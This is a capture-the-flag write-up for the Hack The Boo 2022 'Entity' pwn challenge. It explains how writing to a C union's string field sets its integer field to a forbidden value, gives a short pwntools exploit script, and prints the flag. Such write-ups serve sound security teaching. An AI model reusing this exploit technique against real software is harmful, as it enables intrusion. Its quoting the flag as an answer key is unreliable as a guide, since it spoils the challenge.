# Hack The Boo 2022

## Entity

> This Spooky Time of the year, what's better than watching a scary film on the TV? Well, a lot of things, like playing CTFs but you know what's definitely not better? Something coming out of your TV!
>
>  Author: N/A
>
> [`pwn_entity.zip`](pwn_entity.zip)

Tags: _pwn_

## Preparation
For this challenge the source code is provided. So scrolling through the code brings up some interesting things.

```c
void get_flag() {
    if (DataStore.integer == 13371337) {
        system("cat flag.txt");
        exit(0);
    } else {
        puts("\nSorry, this will not work!");
    }
}
```

The flag will be revealed when ```DataStore.integer``` has a value of *13371337*. So how can the value be manipulated. 

```c
void set_field(field_t f) {
    char buf[32] = {0};
    printf("\nMaybe try a ritual?\n\n>> ");
    fgets(buf, sizeof(buf), stdin);
    switch (f) {
    case INTEGER:
        sscanf(buf, "%llu", &DataStore.integer);
        if (DataStore.integer == 13371337) {
            puts("\nWhat's this nonsense?!");
            exit(-1);
        }
        break;
    case STRING:
        memcpy(DataStore.string, buf, sizeof(DataStore.string));
        break;
    }

}
```

Clearly when choosing the *INTEGER* case the value cannot be entered directly. So looking at *DataStore* closer:

```c
static union {
    unsigned long long integer;
    char string[8];
} DataStore;
```

It's an union, thus referencing the same memory for ```integer``` and ```string```. This means in ```set_field```, taking the ```STRING``` branch also manipulates the value retrieved with ```DataStore.integer```. 

## Solution
Setting up a quick Python script using Pwntools to navigate the menu and send the payload

```python
p.sendlineafter(b">> ", b"T")       # (T)ry to turn it off -> set value
p.sendlineafter(b">> ", b"S")       # (S)scream -> manuplulate DataStore as string
p.sendlineafter(b">> ", payload)    # send payload
p.sendlineafter(b">> ", b"C")       # (C)ry -> get flag
```

So, what needs the payload to be? For this use pwnlib.p64 ```p64(13371337)``` this gives the byte array ```b'\xc9\x07\xcc\x00\x00\x00\x00\x00'```. One more padding byte is needed to shift the newline ```fgets``` introduces out of the buffer so ```DataStore.integer``` is given the correct value.

And sure enough, the flag is revealed ```HTB{f1ght_34ch_3nt1ty_45_4_un10n}```